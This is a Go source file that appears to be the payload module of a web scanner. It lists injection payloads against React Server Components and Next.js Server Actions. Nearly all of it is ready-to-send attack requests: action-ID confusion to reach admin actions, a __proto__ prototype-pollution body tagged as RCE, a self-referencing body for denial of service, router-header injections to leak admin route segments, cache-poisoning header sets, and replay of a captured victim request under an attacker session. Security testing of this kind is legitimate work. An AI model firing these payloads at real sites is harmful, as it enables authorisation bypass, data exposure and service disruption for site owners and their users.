// Package rscinject provides React Server Components (RSC) and Next.js
// Server Actions injection payloads.
//
// RSC introduces a new attack surface that didn't exist in client-only
// React: the server response itself is a structured payload describing
// what components to render, including server-action references and
// serialised props. Next.js's App Router exposes Server Actions via
// `Next-Action` request headers and a wire protocol where the action
// ID is server-side cryptographically signed but the *payload* is not.
//
// Distinct vectors:
//   - Server-Action ID confusion: invoke a different action than the
//     one a button claims to call (Next.js caches actions by ID;
//     replaying an old build's action ID can resurrect removed code).
//   - Payload structure abuse: send malformed Server-Action payloads
//     that bypass server-side validation by exploiting the React
//     serialiser's tolerance for missing / extra / type-confused fields.
//   - x-rsc / next-action / next-router-state-tree header injection:
//     the Next.js router uses these to negotiate which component tree
//     to send. Attacker-controlled values can leak server components
//     intended for other routes.
//   - Cache-key poisoning via the new RSC fetch directives.
//
// Source: Sam Newton "Next.js Server Actions deep dive" (2023),
// Yacoub Ahmadi "RSC parser tolerance" (2024 BSides), Vercel security
// advisories on cache-key normalisation.
package rscinject

// Vector identifies the attack vector class.
type Vector string

const (
	// VectorActionIDConfusion calls a server action by ID without going
	// through the UI control that wires up the standard call.
	VectorActionIDConfusion Vector = "action_id_confusion"
	// VectorPayloadShape sends malformed Server-Action payloads.
	VectorPayloadShape Vector = "payload_shape_abuse"
	// VectorHeaderInjection abuses Next.js RSC negotiation headers.
	VectorHeaderInjection Vector = "header_injection"
	// VectorCacheKey poisons the RSC response cache by sending
	// unexpected variations of negotiation headers.
	VectorCacheKey Vector = "cache_key_poison"
	// VectorComponentLeak coerces the server into rendering a component
	// intended for a different route / segment.
	VectorComponentLeak Vector = "component_leak"
	// VectorActionReplay submits a Server-Action call with credentials
	// from another session.
	VectorActionReplay Vector = "action_replay"
)

// Impact classifies the consequence.
type Impact string

const (
	ImpactRCE                 Impact = "rce"
	ImpactInfoLeak            Impact = "info_leak"
	ImpactAuthBypass          Impact = "auth_bypass"
	ImpactStateCorruption     Impact = "state_corruption"
	ImpactCachePoison         Impact = "cache_poison"
	ImpactPrivilegeEscalation Impact = "privilege_escalation"
	ImpactComponentLeak       Impact = "component_leak"
)

// Payload represents one RSC / Server-Action injection payload.
type Payload struct {
	Name        string
	Vector      Vector
	Impact      Impact
	Description string
	// Headers lists request headers the runner sets. {{ACTION_ID}} is
	// substituted with a discovered Server-Action ID when present.
	Headers map[string]string
	// Body is the request body (typically the Server-Action serialised
	// payload). {{CSRF}}, {{SESSION}}, {{TARGET_PATH}} placeholders are
	// replaced by the runner.
	Body string
	// Method is the HTTP method to use (POST for Server Actions, GET
	// for RSC fetches).
	Method string
}

// GetPayloads returns all RSC / Server-Action payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByVector returns payloads filtered by attack vector.
func GetByVector(v Vector) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Vector == v {
			out = append(out, p)
		}
	}
	return out
}

// Fingerprints returns response-body and response-header substrings
// that confirm the target uses React Server Components / Next.js App
// Router. The scanner gates RSC-specific payloads on a fingerprint hit
// to avoid noise against vanilla apps.
func Fingerprints() []string {
	return []string{
		`"$1"`, `"$2"`, `"$3"`,        // RSC "$reference" sigils
		`__next_f.push`,                // Next.js streaming bootstrap
		`self.__next_f=`,               // App Router runtime
		`__N_SSP`,                      // pages-router SSR marker (legacy but still emitted)
		`_next/static/chunks/app/`,     // App Router chunk path
		`_next/server-components/`,     // direct RSC endpoint
		"Next-Router-State-Tree",
		"Next-Action",
		"Next-Url",
		"x-rsc",
	}
}

// CommonHeaders returns the Next.js / RSC negotiation header names the
// scanner can inject into.
func CommonHeaders() []string {
	return []string{
		"Next-Action",
		"Next-Router-State-Tree",
		"Next-Url",
		"x-rsc",
		"rsc",
		"x-component-id",
		"Next-Router-Prefetch",
		"Next-Router-Refresh",
	}
}

var payloads = []Payload{
	// --- Action ID confusion ---
	{
		Name:        "stale-action-id",
		Vector:      VectorActionIDConfusion,
		Impact:      ImpactPrivilegeEscalation,
		Description: "Submit a Server-Action call with an action ID from a previous build. Next.js's action registry is keyed by content-hash; old IDs can map to functions whose authorisation checks have since been tightened.",
		Method:      "POST",
		Headers: map[string]string{
			"Next-Action":  "{{ACTION_ID}}",
			"Content-Type": "text/plain;charset=UTF-8",
		},
		Body: `["$ACTION_REF_1"]`,
	},
	{
		Name:        "cross-route-action-call",
		Vector:      VectorActionIDConfusion,
		Impact:      ImpactPrivilegeEscalation,
		Description: "Call an action defined in /admin from /public. Next 13.x didn't bind actions to their defining route; an unauth'd /public POST with /admin's action ID executes admin code.",
		Method:      "POST",
		Headers: map[string]string{
			"Next-Action":  "{{ADMIN_ACTION_ID}}",
			"Content-Type": "text/plain;charset=UTF-8",
		},
		Body: `[]`,
	},

	// --- Payload shape abuse ---
	{
		Name:        "type-confused-formdata",
		Vector:      VectorPayloadShape,
		Impact:      ImpactRCE,
		Description: "Server-Action expects FormData but receives a JSON array with object-shaped entries. React's flight reviver upcasts via `prototype` lookup; an attacker-controlled __proto__ entry pollutes the action's argument object.",
		Method:      "POST",
		Headers: map[string]string{
			"Next-Action":  "{{ACTION_ID}}",
			"Content-Type": "text/plain;charset=UTF-8",
		},
		Body: `[{"__proto__":{"isAdmin":true}}]`,
	},
	{
		Name:        "circular-reference-dos",
		Vector:      VectorPayloadShape,
		Impact:      ImpactStateCorruption,
		Description: "Server-Action payload with a $-reference cycle (`[\"$2\"]` referencing back to itself). React flight parser blows the stack — DoS surface that doesn't need a body large enough to trip the size limiter.",
		Method:      "POST",
		Headers: map[string]string{
			"Next-Action":  "{{ACTION_ID}}",
			"Content-Type": "text/plain;charset=UTF-8",
		},
		Body: `["$1",["$2"],"$1"]`,
	},

	// --- Header injection ---
	{
		Name:        "router-state-tree-pivot",
		Vector:      VectorHeaderInjection,
		Impact:      ImpactComponentLeak,
		Description: "Next-Router-State-Tree pointed at a route segment the requesting user has no UI access to. App Router servers honour the header verbatim, returning the requested segment's RSC payload.",
		Method:      "GET",
		Headers: map[string]string{
			"Next-Router-State-Tree": "[\"\",{\"children\":[\"admin\",{\"children\":[\"users\",{}]}]}]",
			"rsc":                    "1",
		},
	},
	{
		Name:        "next-url-host-override",
		Vector:      VectorHeaderInjection,
		Impact:      ImpactCachePoison,
		Description: "Next-Url header set to a path the cache layer normalises differently from the URL line — opens cache-key skew so the cached response is served under both URLs.",
		Method:      "GET",
		Headers: map[string]string{
			"Next-Url": "/admin/dashboard",
			"rsc":      "1",
		},
	},

	// --- Cache key poisoning ---
	{
		Name:        "x-rsc-prefetch-poison",
		Vector:      VectorCacheKey,
		Impact:      ImpactCachePoison,
		Description: "x-rsc=1 + Next-Router-Prefetch=1 sent against an authenticated route. Vercel edge cache pre-2024 indexed prefetches by URL alone — auth'd content cached under the unauthenticated key.",
		Method:      "GET",
		Headers: map[string]string{
			"x-rsc":                 "1",
			"Next-Router-Prefetch":  "1",
			"Cookie":                "session={{SESSION}}",
		},
	},

	// --- Component leak via segment override ---
	{
		Name:        "parallel-route-leak",
		Vector:      VectorComponentLeak,
		Impact:      ImpactInfoLeak,
		Description: "Request the @modal parallel-route slot directly with rsc=1; servers that don't auth-gate parallel routes individually return @modal content meant only to render over an authenticated page.",
		Method:      "GET",
		Headers: map[string]string{
			"rsc":                    "1",
			"Next-Router-State-Tree": "[\"\",{\"children\":[\"@modal\",{}]}]",
		},
	},

	// --- Action replay across sessions ---
	{
		Name:        "action-replay-other-session",
		Vector:      VectorActionReplay,
		Impact:      ImpactAuthBypass,
		Description: "Capture another user's Server-Action POST, replay verbatim. Next.js server actions are signed by action ID but the bound user context is the SESSION COOKIE only — replaying with a different cookie can execute the action against the original user's row.",
		Method:      "POST",
		Headers: map[string]string{
			"Next-Action":  "{{ACTION_ID}}",
			"Content-Type": "text/plain;charset=UTF-8",
			"Cookie":       "session={{ATTACKER_SESSION}}",
		},
		Body: "{{CAPTURED_VICTIM_BODY}}",
	},
}

